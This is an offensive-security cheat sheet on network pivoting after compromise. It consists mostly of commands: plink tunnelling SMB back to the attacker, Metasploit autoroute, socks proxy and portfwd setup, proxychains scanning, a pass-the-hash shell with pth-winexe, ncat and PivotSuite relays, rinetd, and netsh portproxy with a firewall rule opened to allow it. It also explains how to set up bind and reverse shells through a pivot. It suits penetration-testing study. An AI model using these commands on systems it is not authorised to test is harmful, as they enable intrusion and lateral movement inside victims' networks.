# 🔧 Other Tools

## plink (windows)

```
plink.exe -l root -R 445:127.0.0.1:445 YOURIPADDRESS
```

## Metasploit

### MANUAL ROUTE

this method will give the full access to the target IP address like its siting in our lan ( only accessible in metasploit )

```
background the session
route add 10.0.1.0/24 [session id]
```

### AUTO ROUTE

this method will give the full access to the target IP address like its siting in our lan ( only accessible in metasploit )

```
run autoroute -p >>> list active routing tables
run autoroute -s 10.1.1.0 -n 255.255.255.0 >>> netmask is optional
run autoroute -d -s 10.10.10.1  >>> delete autoroute on ip
run autoroute -s 10.10.10.1/24 >>> can use CIDR
```

### PROXY

add a proxy to proxychains.conf and use it inside and outside of metasploit

```
use auxiliary/server/socks4a
use auxiliary/server/socks5
use auxiliary/server/socks_unc
set srvport 8080 → set proxy local port
```

add 127.0.0.1 8080 to proxychains and make sure there are no other proxies in the config file:

```
socks4  127.0.0.1  8080
```

now run commands with proxychains prefix

```
proxychains nmap -Pn -sT -sV -p- [target]
proxychains pth-winexe -U windows10/user123//10.0.1.5 cmd.exe
```

### PORT FORWARD

forward only the given remote port to the given local port specifically ( only accessible in msfconsole )

```
portfwd [add | delete | list | flush]  -L [optional local ip] -l [local port] -p [remote port] -r [remote ip]

portfwd add -L 0.0.0.0 -l 8000 -p 80 -r 10.1.0.5
```

now we can scan our local port 8000 to scan the remote port 80 of the target

### PIVOTING BIND SHELL

usually used when exploiting a machine in the internal network. first we have to do port forwarding to scan the network

```
portfwd add -L 0.0.0.0 -l 8000 -p 80 -r 10.1.0.5
```

now add a route to target ip in the internal network

```
route -h
route add 10.0.1.5/24 [session number] 
```

now choose your exploit and set the rhost to the target ip in the internal network and run the exploit and remember:

```
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 2552.55.255.0 8)
use auxiliary/server/socks4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

Another way:

```
background #meterpreter session
use post/windows/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks4a
run #Proxy port 1080 by default
```

{% hint style="warning" %}
ALLWAYS USE A BIND SHELL WHILE PIVOTING
{% endhint %}

if we use a reverse shell the target machine on the internal network wont be able to route back the packets to us

![](<../../.gitbook/assets/image (267).png>)

### PIVOTING REVERSE SHELL

while using a reverse shell with pivoting we have to set the RHOST to target ip in the internal network and set the LHOST to the machine that we have already compromized

```
RHOST >>> internal target
LHOST >>> compromized machine
```

![](<../../.gitbook/assets/image (269).png>)

## Ncat

```
# Ncat =/= netcat
# Enhanced version, developped by nmap dev and often packaged with
# Ciphered connexion, IP restriction
# To pivot, needed on both attacker and pivot machine

# Attacker (broker == accept multiple connexions)
$ ncat -lv --broker --max-conns 2

# Pivot
# We connect to attacker and target
$ ncat -v 192.168.2.149 31337 -c 'ncat -v 10.42.42.2 80'
```

## PivoteSuite

```
# Similar features to other tools but support multilevel pivot
# Like Metasploit

# "Remote" local port forwarding
# On the pivot
$ pivotsuite -S -F --server-option=PF --forward-ip=10.42.42.2 --forward-port=80 --server-ip=192.168.2.105 --server-port=8080

# "Remote" dynamic port forwarding
$ pivotsuite -S -F --server-option=SP --server-ip=192.168.2.105 --server-port=8080
```

## RINETD

```
 sudo apt install rinetd
```

edit the config file:

```
nano /etc/rinetd.conf
```

![](<../../.gitbook/assets/image (268).png>)

```
service rinetd restart
```

bind address is attacker machine bind port is the listening incoming port connectaddress is the address to forward the traffic to and connectport is the target port.

## NETSH (Windows)

{% hint style="warning" %}
for this to work, the Windows system must have the IP Helper service running and IPv6 support must be enabled for the interface we want to use. Fortunately, both are on and enabled by default on Windows operating systems.
{% endhint %}

```
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
```

test:

```
smbclient -L 10.11.0.22 --port=4455 --user=Administrator
```





